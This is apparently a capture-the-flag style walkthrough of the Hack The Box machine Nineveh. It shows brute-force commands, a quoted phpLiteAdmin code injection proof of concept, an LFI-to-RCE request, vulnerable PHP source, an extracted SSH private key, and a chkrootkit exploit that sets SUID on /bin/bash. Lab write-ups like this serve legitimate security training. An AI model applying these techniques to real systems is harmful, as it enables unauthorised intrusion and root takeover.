# Enumeration
## nmap
```bash
PORT    STATE SERVICE  REASON  VERSION
80/tcp  open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/organizationalUnitName=Support/emailAddress=admin@nineveh.htb/localityName=Athens
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/organizationalUnitName=Support/emailAddress=admin@nineveh.htb/localityName=Athens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182 94b8 0210 7992 bf01 e802 b26f 8639
| SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0
| -----BEGIN CERTIFICATE-----
| MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD
| VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
| BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu
| aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN
| MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN
| BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl
| Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx
| IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2
| WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp
| eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO
| GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C
| U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi
| AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV
| HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy
| OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma
| AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U
| qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4
| Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d
| 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1
| CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb
| KrYQgX28Ulf8OSGJuA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

## certificate
admin@nineveh.htb
nineveh.htb

## gobuster
```bash
└─$ gobuster dir -u https://nineveh.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -b 404,403 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nineveh.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/11 15:32:26 Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 301) [Size: 309] [--> https://nineveh.htb/db/]
Progress: 23268 / 30001 (77.56%)                                            [ERROR] 2021/06/11 15:32:44 [!] parse "https://nineveh.htb/error\x1f_log": net/url: invalid control character in URL
                                                                             
===============================================================
2021/06/11 15:32:47 Finished
===============================================================
```

```bash
└─$ gobuster dir -u http://nineveh.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  -t 100 -b 404,403 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/11 15:38:40 Starting gobuster in directory enumeration mode
===============================================================
/department           (Status: 301) [Size: 315] [--> http://nineveh.htb/department/]
Progress: 23199 / 30001 (77.33%)                                                   [ERROR] 2021/06/11 15:38:57 [!] parse "http://nineveh.htb/error\x1f_log": net/url: invalid control character in URL
                                                                                    
===============================================================
2021/06/11 15:39:00 Finished
===============================================================
```

```
└─$ gobuster dir -u http://nineveh.htb/department -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  -t 100 -b 404,403 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb/department
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/11 15:41:14 Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 321] [--> http://nineveh.htb/department/files/]
/css                  (Status: 301) [Size: 319] [--> http://nineveh.htb/department/css/]  
Progress: 23795 / 30001 (79.31%)                                                         [ERROR] 2021/06/11 15:41:32 [!] parse "http://nineveh.htb/department/error\x1f_log": net/url: invalid control character in URL
                                                                                          
===============================================================
2021/06/11 15:41:35 Finished
===============================================================
```

```bash
└─$ gobuster dir -u http://nineveh.htb/department/files/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt  -t 100 -b 404,403 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb/department/files/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/11 15:43:13 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 68]
/.                    (Status: 200) [Size: 68]
                                              
===============================================================
2021/06/11 15:43:23 Finished
===============================================================
```

## Pages
https://nineveh.htb/db/

![[https_db.png]](https_db.png)

known path: /var/www/ssl

http://nineveh.htb/department/

![[http_dept_login.png]](http_dept_login.png)

username enumeration - indicates whether username is invalid as well as password

Note:
```html
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

# Exploit

## phpLiteAdmin
https://nineveh.htb/db/
discovered creds through brute force: password123
```bash
└─$ wfuzz -u 'https://nineveh.htb/db/index.php' -d 'password=FUZZ&remember=yes&login=Log+In&proc_login=true' -w /usr/share/wordlists/rockyou.txt --hw 976  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nineveh.htb/db/index.php
Total requests: 14344392

=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================

000001384:   200        485 L    1130 W     14088 Ch    "password123" 
```

![[https_db_authenticated.png]](https_db_authenticated.png)

```bash
└─$ searchsploit phpliteadmin
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                                                                                                                                                     | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                                                                                                              | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                                                                                           | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                                                                                                            | php/webapps/39714.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```php
# Exploit Title: phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
# Google Dork: inurl:phpliteadmin.php (Default PW: admin)
# Date: 01/10/2013
# Exploit Author: L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt
# Vendor Homepage: http://code.google.com/p/phpliteadmin/
# Vendor Status: Informed
# Software Link: http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip
# Version: 1.9.3
# Tested on: Windows and Linux

Description:

phpliteadmin.php#1784: 'Creating a New Database' => 
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php

Done!

Proof: http://goo.gl/ZqPVL
```

## Path leak
![[https_db_path.png]](https_db_path.png)

## Brute force login
nineveh.htb/department
```
└─$ hydra -l admin -P /usr/share/seclists/Passwords/probable-v2-top1575.txt nineveh.htb http-post-form '/department/login.php:username=^USER^&password=^PASS^:Invalid' -I 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-11 16:54:31
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1575 login tries (l:1/p:1575), ~99 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^:Invalid
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-11 16:54:43
```

admin:1q2w3e4r5t

![[http_dept_authenticated.png]](http_dept_authenticated.png)

```html
<li>Have you fixed the login page yet! hardcoded username and password is really bad idea!</li>
<li>check your serect folder to get in! figure it out! this is your challenge</li>
<li>Improve the db interface.
<small>~amrois</small>
```
`http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt`
LFI?

## LFI
`/department/manage.php?notes=files/ninevehNotes/../../../../../../../etc/passwd`

## LFI to RCE
Use https://nineveh.htb/db/ to modify DB files on disk and include php content
![[lfi_to_rce.png]](lfi_to_rce.png)
![[LFI_RCE_burp.png]](LFI_RCE_burp.png)

```
POST /department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/asdf.txt HTTP/1.1
Host: nineveh.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://nineveh.htb/department/manage.php
Connection: close
Cookie: PHPSESSID=gv8co12hng0r8gbtpa9jd06qa4
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=ls
```

## manage.php source
```php
<?php 
session_start();


  if (!isset($_SESSION['username'])){
      header("Location: login.php");
      die();
  } else {
  require "header.php";
?>

<div class="row">
  <div class="col-lg-12">
      <?php if (isset($error)) { ?>
          <span class="text text-danger"><b><?php echo $error; ?></b></span>
      <?php } ?>
    <h2>Hi <?php echo $_SESSION['username']; ?>,</h2>
        <img src=./underconstruction.jpg alt="Under Construction!" style="width:800px;height:600px;"> <br>
  </div>
</div>
<?php if(isset($_GET['notes'])){ ?>
<pre>
<?php
  $file = @$_GET['notes'];
  if(strlen($file) > 55)
     exit("File name too long.");
  $fileName = basename($file);
  if(!strpos($file, "ninevehNotes"))
    exit("No Note is selected.");
  echo "<pre>";
  include($file);
  echo "</pre>";
?>

</pre> 

<?php } ?>

<?php
  require "footer.php"; }
?>
```

# Privelege escalation

## linpeas
```bash
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                      
/usr/sbin/report-reset.sh                                                
/usr/bin/gettext.sh

[+] Searching ssl/ssh files
/home/amrois/.ssh/authorized_keys  /usr/bin/passwd                                                                                                                                                                                         
Port 22
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
PasswordAuthentication no
UsePAM yes
  --> Some certificates were found (out limited):
/etc/apache2/ssl/nineveh/nineveh.crt

 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow

```

## Secret files
Secret files found:
https://nineveh.htb/secure_notes/nineveh.png

PNG contains extra text appended to the end, including ssh key
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```



```
amrois@nineveh:/var/mail$ cat amrois 
From root@nineveh.htb  Fri Jun 23 14:04:19 2017
Return-Path: <root@nineveh.htb>
X-Original-To: amrois
Delivered-To: amrois@nineveh.htb
Received: by nineveh.htb (Postfix, from userid 1000)
        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
To: amrois@nineveh.htb
From: root@nineveh.htb
Subject: Another Important note!
Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)

Amrois! please knock the door next time! 571 290 911

```

```bash
amrois@nineveh:/var/mail$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

```

## port knocking SSH
```bash
nc -w 1 $IP 571; nc -w 1 $IP 290; nc -w 1 $IP 911; ssh -i amrois.key amrois@$IP
```

## logged in as amrois

### linpeas
```bash
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                                                       
/home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                                                
New path exported: /home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

You own the script: /usr/sbin/report-reset.sh
/usr/bin/gettext.sh


```


## chrootkit
PSPY output:
```
2021/06/11 20:55:03 CMD: UID=0    PID=16729  | /bin/sh /usr/bin/chkrootkit 
```

```bash
└─$ searchsploit chkrootkit              
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                                                     | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                                                             | linux/local/33899.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Using linux/local/33899.txt
Create /tmp/update, add +x
```bash
amrois@nineveh:/tmp$ cat update 
#!/bin/bash

chmod +s /bin/bash
```

```bash
amrois@nineveh:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
amrois@nineveh:/tmp$ bash -p
bash-4.3# cd /root
bash-4.3# ls
root.txt  test.txt  vulnScan.sh
bash-4.3# cat root.txt
```

# Loot and findings

## email
admin@nineveh.htb

## passwd: found from [[20-exploit#LFI]](20-exploit.md#LFI)
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
```

## Credentials
|user|pass|location|reference|
|---|---|---|---|
|(no username)|password123| (https) nineveh.htb/db/|[[20-exploit#phpLiteAdmin]](20-exploit.md#phpLiteAdmin)
|admin|1q2w3e4r5t|nineveh.htb/department|[[20-exploit#Brute force login]](20-exploit#Brute%20force%20login)
|amrois|SSH private key|SSH|[[30-privesc#Secret files]](30-privesc.md#Secret-files)
